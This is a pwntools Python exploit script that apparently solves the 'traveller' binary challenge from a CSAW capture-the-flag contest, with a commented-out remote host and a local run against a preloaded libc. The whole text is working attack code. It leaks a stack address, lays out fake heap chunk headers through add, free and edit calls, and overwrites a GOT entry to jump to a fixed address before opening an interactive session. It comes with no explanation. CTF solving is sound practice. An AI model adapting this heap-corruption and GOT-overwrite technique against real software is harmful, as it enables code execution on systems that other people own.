from pwn import *
#io=remote("pwn.chal.csaw.io",1003)
io=process("./traveller",env = {"LD_PRELOAD" : "./libc-2.23.so"})
io.recvuntil("Welcome to trip management system. \n")
leak = io.recv(14)
leak = int(leak,16)
log.info("stack leak = " + hex(leak))
def add(choice,payload):
   io.send('1'.ljust(4," "))
   io.send(str(choice).ljust(4," "))
   if(choice==1):
       size=0x80
   elif(choice==2):
       size=0x110
   elif(choice==3):
       size=0x128
   elif(choice==4):
       size=0x150
   elif(choice==5):
       size=0x200
   io.send(payload.ljust(size," "))

def free(index):
   io.send('3'.ljust(4," "))
   io.send(str(index).ljust(0x14," "))
def edit(choice,payload):
   io.send('2'.ljust(4," "))
   io.sendline(str(choice).ljust(0x14," "))
   io.sendline(payload)
def view(index):
   io.send('4'.ljust(4," "))
   io.sendlineafter("view? \n",str(index))
add(2,'a'*0x80)
add(3,'b'*0x80)
free(0)
io.sendline()
add(1,"c"*50)
io.sendline()
b="d"*(0x200-18)+p64(0)+p64(0x51)
add(5,b)
gdb.attach(io)
p="1"*288+p64(0x1a0)
io.sendline()
edit(0,p)
io.sendline()
c="2"*46+p64(0)+p64(0x51)
add(1,c)
got=0x0000000000602028
payload="5"*62+p64(0x50)+p64(0x20)+p64(got)+p64(7)
io.sendline()
free(2)
io.sendline()
add(3,payload)
io.sendline()
io.send('2'.ljust(4," "))
io.sendline(str(0).ljust(0x14," "))
io.sendline(p64(0x00000000004008b6))
io.interactive()
